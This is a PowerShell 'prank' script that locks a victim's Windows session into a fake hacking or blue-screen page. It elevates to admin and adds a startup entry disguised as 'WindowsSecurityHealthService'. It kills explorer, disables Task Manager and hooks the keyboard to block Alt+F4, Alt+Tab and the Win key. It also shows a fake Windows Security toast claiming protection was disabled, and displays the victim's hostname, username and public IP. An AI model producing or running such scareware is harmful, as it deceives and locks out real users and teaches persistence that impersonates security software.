<#
.SYNOPSIS
    Windows Hacking Prank Launcher — Admin Required

.DESCRIPTION
    - Gathers real system info (hostname, user, public IP, disk, RAM)
    - Hides the taskbar
    - Optionally disables Task Manager (re-enabled on exit)
    - Opens the prank page in Edge/Chrome kiosk mode (no browser UI)
    - Installs itself as a startup entry limited to 2 reboots
    - On exit (victim hits Alt+Esc then Alt+Up): restores everything and
      removes the startup entry permanently

.PARAMETER BSOD
    Launch the fake Blue Screen of Death instead of the hacking terminal.

.PARAMETER NoTaskMgrBlock
    Skip disabling Task Manager (victim can still Ctrl+Shift+Esc out).

.PARAMETER Uninstall
    Remove the startup entry and counter without launching the prank.

.PARAMETER Startup
    Internal flag — set automatically in the startup registry entry.
    Activates the reboot counter check; do not pass this manually.

.EXAMPLE
    # Right-click launch-prank.ps1 → "Run as Administrator"
    .\launch-prank.ps1

    # Fake BSOD mode
    .\launch-prank.ps1 -BSOD

    # Remove startup persistence without running
    .\launch-prank.ps1 -Uninstall
#>
param(
    [switch]$BSOD,
    [switch]$NoTaskMgrBlock,
    [switch]$Uninstall,
    [switch]$Startup   # set automatically by the registry Run entry
)

$ErrorActionPreference = 'Stop'
$StartupName = 'WindowsSecurityHealthService'
$StartupKey  = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$TmPath      = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System'
$CounterKey  = 'HKCU:\Software\WinDefend'
$CounterName = 'ServiceRunCount'
$MaxRuns     = 2

# ─── Uninstall mode ──────────────────────────────────────────────────────────
if ($Uninstall) {
    Remove-ItemProperty -Path $StartupKey -Name $StartupName -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path $TmPath     -Name 'DisableTaskMgr' -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path $CounterKey -Name $CounterName -ErrorAction SilentlyContinue
    Write-Host 'Prank startup entry removed.' -ForegroundColor Green
    exit 0
}

# ─── Elevation check — re-launch as Administrator if needed ──────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    $relaunchArgs = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    if ($BSOD)           { $relaunchArgs += ' -BSOD' }
    if ($NoTaskMgrBlock) { $relaunchArgs += ' -NoTaskMgrBlock' }
    Start-Process powershell $relaunchArgs -Verb RunAs
    exit
}

# ─── Reboot counter — only active when launched from the startup entry ────────
if ($Startup) {
    $count = (Get-ItemProperty -Path $CounterKey -Name $CounterName `
                               -ErrorAction SilentlyContinue).$CounterName
    if ($null -eq $count) { $count = 0 }

    if ($count -ge $MaxRuns) {
        # Limit reached — clean up silently and exit without showing anything
        Remove-ItemProperty -Path $StartupKey -Name $StartupName -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $CounterKey -Name $CounterName -ErrorAction SilentlyContinue
        exit 0
    }

    # Increment before running so a hard power-off still counts the run
    New-Item -Path $CounterKey -Force | Out-Null
    Set-ItemProperty -Path $CounterKey -Name $CounterName -Value ($count + 1)

    # Remove the startup entry on the last allowed run so reboot 3 is clean
    # even if the finally block is interrupted by a sudden shutdown
    if (($count + 1) -ge $MaxRuns) {
        Remove-ItemProperty -Path $StartupKey -Name $StartupName -ErrorAction SilentlyContinue
    }
}

# ─── Win32 API — taskbar control + window-style manipulation + keyboard hook ──
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll")] public static extern int    ShowWindow(IntPtr hWnd, int nCmd);
    [DllImport("user32.dll")] public static extern IntPtr FindWindow(string cls, string win);
}
public class WinStyle {
    const int  GWL_EXSTYLE      = -20;
    const uint WS_EX_APPWINDOW  = 0x00040000;
    const uint WS_EX_TOOLWINDOW = 0x00000080;
    const uint WS_EX_NOACTIVATE = 0x08000000;

    public delegate bool EnumWndProc(IntPtr hwnd, IntPtr lp);
    [DllImport("user32.dll")] public static extern bool EnumWindows(EnumWndProc fn, IntPtr lp);
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr h, out uint pid);
    [DllImport("user32.dll")] public static extern uint GetWindowLong(IntPtr h, int i);
    [DllImport("user32.dll")] public static extern uint SetWindowLong(IntPtr h, int i, uint v);
    [DllImport("user32.dll")] public static extern bool IsWindowVisible(IntPtr h);

    public static void HideFromShell(int pid) {
        EnumWindows((hwnd, _) => {
            uint wpid;
            GetWindowThreadProcessId(hwnd, out wpid);
            if ((int)wpid == pid && IsWindowVisible(hwnd)) {
                uint s = GetWindowLong(hwnd, GWL_EXSTYLE);
                s = (s & ~WS_EX_APPWINDOW) | WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE;
                SetWindowLong(hwnd, GWL_EXSTYLE, s);
            }
            return true;
        }, IntPtr.Zero);
    }
}
// Low-level keyboard hook — blocks system shortcuts before Windows processes them.
// WH_KEYBOARD_LL intercepts keystrokes before the OS turns Alt+F4 into WM_CLOSE,
// before Alt+Tab opens the switcher, and before the Win key opens the Start menu.
// Ctrl+Alt+Del is kernel-handled and CANNOT be blocked from user mode (by design).
public class KbHook {
    const int WH_KEYBOARD_LL = 13;
    const int WM_KEYDOWN     = 0x0100;
    const int WM_SYSKEYDOWN  = 0x0104;
    const int WM_QUIT        = 0x0012;
    const uint VK_F4     = 0x73;
    const uint VK_TAB    = 0x09;
    const uint VK_LWIN   = 0x5B;
    const uint VK_RWIN   = 0x5C;
    const uint VK_ESCAPE = 0x1B;
    const int  VK_MENU   = 0x12;   // Alt
    const int  VK_CTRL   = 0x11;

    public delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);

    [StructLayout(LayoutKind.Sequential)]
    struct KBDLLHOOKSTRUCT {
        public uint vkCode, scanCode, flags, time;
        public IntPtr dwExtraInfo;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct MSG {
        public IntPtr hwnd; public uint message;
        public UIntPtr wParam; public IntPtr lParam;
        public uint time; public int ptX, ptY;
    }

    [DllImport("user32.dll")]   static extern IntPtr SetWindowsHookEx(int id, HookProc fn, IntPtr mod, uint tid);
    [DllImport("user32.dll")]   static extern bool   UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")]   static extern IntPtr CallNextHookEx(IntPtr h, int code, IntPtr wp, IntPtr lp);
    [DllImport("user32.dll")]   static extern short  GetAsyncKeyState(int vk);
    [DllImport("user32.dll")]   static extern int    GetMessage(out MSG msg, IntPtr hwnd, uint min, uint max);
    [DllImport("user32.dll")]   static extern bool   TranslateMessage(ref MSG msg);
    [DllImport("user32.dll")]   static extern IntPtr DispatchMessage(ref MSG msg);
    [DllImport("user32.dll")]   static extern bool   PostThreadMessage(uint id, uint msg, IntPtr wp, IntPtr lp);
    [DllImport("kernel32.dll")] static extern uint   GetCurrentThreadId();

    static HookProc _proc;
    static IntPtr   _hook = IntPtr.Zero;
    static uint     _tid;

    public static void Install() {
        _tid  = GetCurrentThreadId();
        _proc = HookCallback;   // keep delegate alive so GC can't collect it
        _hook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, IntPtr.Zero, 0);
        MSG msg;
        while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0) {
            TranslateMessage(ref msg);
            DispatchMessage(ref msg);
        }
    }

    public static void Uninstall() {
        if (_hook != IntPtr.Zero) { UnhookWindowsHookEx(_hook); _hook = IntPtr.Zero; }
        PostThreadMessage(_tid, (uint)WM_QUIT, IntPtr.Zero, IntPtr.Zero);
    }

    static IntPtr HookCallback(int code, IntPtr wp, IntPtr lp) {
        if (code >= 0 && (wp == (IntPtr)WM_KEYDOWN || wp == (IntPtr)WM_SYSKEYDOWN)) {
            var kb   = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));
            bool alt  = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
            bool ctrl = (GetAsyncKeyState(VK_CTRL)  & 0x8000) != 0;
            if (alt  && kb.vkCode == VK_F4)                      return (IntPtr)1; // Alt+F4  → no WM_CLOSE
            if (alt  && kb.vkCode == VK_TAB)                     return (IntPtr)1; // Alt+Tab → no switcher
            if (kb.vkCode == VK_LWIN || kb.vkCode == VK_RWIN)   return (IntPtr)1; // Win key → no Start/Task
            if (ctrl && kb.vkCode == VK_ESCAPE)                  return (IntPtr)1; // Ctrl+Esc→ no Start menu
            // Alt+Esc and Alt+Up are intentionally NOT blocked — they form the reveal chord.
        }
        return CallNextHookEx(_hook, code, wp, lp);
    }
}
'@

$taskbar  = [WinAPI]::FindWindow('Shell_TrayWnd',           $null)
$taskbar2 = [WinAPI]::FindWindow('Shell_SecondaryTrayWnd',  $null)
$overflow = [WinAPI]::FindWindow('NotifyIconOverflowWindow', $null)

# ─── Gather real system data ──────────────────────────────────────────────────
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME

try {
    $pubIP = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -TimeoutSec 4).Content.Trim()
} catch {
    $pubIP = '203.0.113.1'   # RFC 5737 documentation address as safe fallback
}

$diskC = Get-PSDrive C | ForEach-Object {
    "$([math]::Round($_.Used / 1GB)) GB / $([math]::Round(($_.Used + $_.Free) / 1GB)) GB"
}

$ramGB = [math]::Round(
    (Get-CimInstance Win32_PhysicalMemory | Measure-Object Capacity -Sum).Sum / 1GB
)

# ─── Install startup persistence (max 2 reboots) ──────────────────────────────
# -Startup tells the script it was launched from the registry Run key so it
# activates the reboot counter. Counter starts at 0; each boot increments it
# and the entry self-removes when it hits $MaxRuns (2).
$startupArgs = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Startup"
if ($BSOD)           { $startupArgs += ' -BSOD' }
if ($NoTaskMgrBlock) { $startupArgs += ' -NoTaskMgrBlock' }
Set-ItemProperty -Path $StartupKey -Name $StartupName -Value "powershell $startupArgs"

# Initialise counter (only on fresh install, not when already running from startup)
if (-not $Startup) {
    New-Item -Path $CounterKey -Force | Out-Null
    Set-ItemProperty -Path $CounterKey -Name $CounterName -Value 0
}

# ─── Hide taskbar (primary + secondary monitors + notification overflow) ──────
[WinAPI]::ShowWindow($taskbar,  0) | Out-Null
if ($taskbar2 -ne [IntPtr]::Zero) { [WinAPI]::ShowWindow($taskbar2, 0) | Out-Null }
if ($overflow -ne [IntPtr]::Zero) { [WinAPI]::ShowWindow($overflow, 0) | Out-Null }

# Kill the explorer shell entirely — removes Start menu, desktop, taskbar for good.
# The finally block restarts it on cleanup.
Get-Process 'explorer' -ErrorAction SilentlyContinue |
    Stop-Process -Force -ErrorAction SilentlyContinue

# ─── Optionally disable Task Manager ─────────────────────────────────────────
if (-not $NoTaskMgrBlock) {
    New-Item -Path $TmPath -Force | Out-Null
    Set-ItemProperty -Path $TmPath -Name 'DisableTaskMgr' -Value 1
    # Note: Ctrl+Alt+Del (the secure attention sequence) always works at OS
    # level and cannot be fully blocked — this only blocks Ctrl+Shift+Esc.
}

# ─── Native Windows toast notification ───────────────────────────────────────
try {
    [Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime] | Out-Null
    [Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]          | Out-Null
    $toastXml = @'
<toast><visual><binding template="ToastGeneric">
<text>Windows Security</text>
<text>Real-time protection has been disabled by an administrator.</text>
</binding></visual></toast>
'@
    $doc = New-Object Windows.Data.Xml.Dom.XmlDocument
    $doc.LoadXml($toastXml)
    $toast = New-Object Windows.UI.Notifications.ToastNotification $doc
    [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier(
        'Windows.SystemToast.SecurityAndMaintenance').Show($toast)
} catch {}

# ─── Build URL with real system data as query params ─────────────────────────
$page = if ($BSOD) { 'bsod-prank.html' } else { 'windows-hacking-prank.html' }
$htmlPath = Join-Path $PSScriptRoot $page
$query = "hostname=$([uri]::EscapeDataString($hostname))" +
         "&user=$([uri]::EscapeDataString($username))" +
         "&ip=$([uri]::EscapeDataString($pubIP))" +
         "&disk=$([uri]::EscapeDataString($diskC))" +
         "&ram=${ramGB}GB"
$url = "file:///$($htmlPath.Replace('\', '/'))?$query"

# ─── Launch in kiosk mode ─────────────────────────────────────────────────────
# Edge kiosk: no address bar, no title bar, no close button, fullscreen.
# The prank's reveal chord (Alt+Esc → Alt+Up) calls window.close(), which
# exits kiosk and unblocks the Wait-Process below.
$chromePath = "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe"
$edgePath   = "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe"

$browser = if     (Test-Path $chromePath) { $chromePath }   # prefer Chrome
           elseif (Test-Path $edgePath)   { $edgePath }
           else                           { $null }

try {
    if ($browser) {
        $kioskFlags = "--kiosk `"$url`" --edge-kiosk-type=fullscreen " +
                      "--no-first-run --disable-features=TranslateUI"
        $proc     = Start-Process $browser $kioskFlags -PassThru
        $procName = [System.IO.Path]::GetFileNameWithoutExtension($browser)

        # Background runspace: strip every browser window from taskbar + Alt+Tab every 2 s.
        # Chrome spawns renderer/GPU/network child processes that each create new windows,
        # so a one-shot call at startup isn't enough — we keep re-applying.
        $rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
        $rs.Open()
        $rs.SessionStateProxy.SetVariable('n', $procName)
        $rs.SessionStateProxy.SetVariable('s', $proc.SessionId)
        $hider = [System.Management.Automation.PowerShell]::Create()
        $hider.Runspace = $rs
        $hider.AddScript({
            while ($true) {
                Start-Sleep -Seconds 2
                try {
                    $ids = (Get-Process -Name $n -ErrorAction SilentlyContinue |
                            Where-Object { $_.SessionId -eq $s }).Id
                    foreach ($id in $ids) { [WinStyle]::HideFromShell($id) }
                } catch {}
            }
        }) | Out-Null
        $hider.BeginInvoke() | Out-Null

        # Low-level keyboard hook — swallows Alt+F4, Alt+Tab, Win key, Ctrl+Esc
        # at the OS level before Windows can act on them. KbHook.Install() runs
        # a GetMessage loop so the hook stays alive for the duration of the prank.
        $hookRs   = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
        $hookRs.Open()
        $hookPwsh = [System.Management.Automation.PowerShell]::Create()
        $hookPwsh.Runspace = $hookRs
        $hookPwsh.AddScript({ [KbHook]::Install() }) | Out-Null
        $hookPwsh.BeginInvoke() | Out-Null

        # Wait until ALL Edge/Chrome processes spawned by this kiosk session exit
        Start-Sleep -Seconds 3   # give the browser time to launch
        do { Start-Sleep -Seconds 1 } while (
            Get-Process -Name $procName -ErrorAction SilentlyContinue |
            Where-Object { $_.SessionId -eq $proc.SessionId }
        )
        try { $hider.Stop();   $rs.Close()   } catch {}
        try { [KbHook]::Uninstall() }          catch {}
        try { $hookPwsh.Stop(); $hookRs.Close() } catch {}
    } else {
        # No supported kiosk browser found — open in default browser (no lockdown)
        Start-Process $url
        Read-Host 'Press Enter after the victim has seen the prank, then cleanup will run'
    }
} finally {
    # ─── Cleanup — runs when the browser closes (reveal chord or Alt+F4) ─────
    # Also runs on clean system shutdown; does NOT reliably run on hard power-off,
    # which is fine — the reboot counter handles that case.
    [WinAPI]::ShowWindow($taskbar, 5) | Out-Null   # 5 = show/restore
    if ($taskbar2 -ne [IntPtr]::Zero) { [WinAPI]::ShowWindow($taskbar2, 5) | Out-Null }
    if ($overflow -ne [IntPtr]::Zero) { [WinAPI]::ShowWindow($overflow, 5) | Out-Null }
    # Restart explorer if we killed it at startup and it hasn't auto-respawned
    if (-not (Get-Process explorer -ErrorAction SilentlyContinue)) {
        Start-Process explorer.exe
    }
    Remove-ItemProperty -Path $TmPath     -Name 'DisableTaskMgr' -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path $StartupKey -Name $StartupName     -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path $CounterKey -Name $CounterName     -ErrorAction SilentlyContinue
}
